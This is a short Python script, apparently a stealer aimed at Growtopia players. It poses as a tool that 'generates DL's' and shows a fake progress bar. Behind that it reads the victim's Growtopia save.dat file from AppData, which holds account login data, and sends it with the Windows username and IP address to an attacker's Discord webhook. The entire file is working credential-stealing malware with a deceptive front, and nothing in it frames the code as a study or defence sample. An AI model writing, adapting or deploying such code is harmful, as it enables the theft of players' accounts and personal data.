import os
from discord_webhook import DiscordWebhook, DiscordEmbed
from tqdm import tqdm
from time import sleep
import socket

#/* Code by deware *\

os.system('cls')

url_hook = "webhook goes here"

usr = os.environ['USERNAME']

path = 'C:\\Users\\'+usr+'\\AppData\\Local\\Growtopia\\save.dat'

hostname = socket.gethostname() 

ip_adress = socket.gethostbyname(hostname)

while True:
    question = input(f"1 - Generate DL's\n>>")

    if(question == "1" or 1):
        for i in tqdm(range(100)):
            sleep(0.01)
        print("\n\nGenerating DL's... Please wait.")
    else:
        print("Invalid function!")
        sleep(2)

    webhook = DiscordWebhook(url=url_hook, username="New account.", avatar_url="https://i.ytimg.com/vi/v6limdoKGvg/maxresdefault.jpg")
    with open(path, 'rb') as f:

        embed = DiscordEmbed(title='```deware.```', description='```new acc!.```', color='280baa')
        embed.set_thumbnail(url="https://pbs.twimg.com/media/E3sVHm-XoAEOpU4.jpg:large")
        embed.set_footer(text='deware!', icon_url='https://i.kym-cdn.com/photos/images/newsfeed/001/508/394/28f.jpg')
        embed.set_timestamp()
        embed.add_embed_field(name=f'Ip Adress:', value=ip_adress)
        embed.add_embed_field(name=f'Username:', value=usr)

        webhook.add_embed(embed)
        webhook.add_file(file=f.read(), filename="save.dat")

        response = webhook.execute()
        print("Blah Blah Blah...")
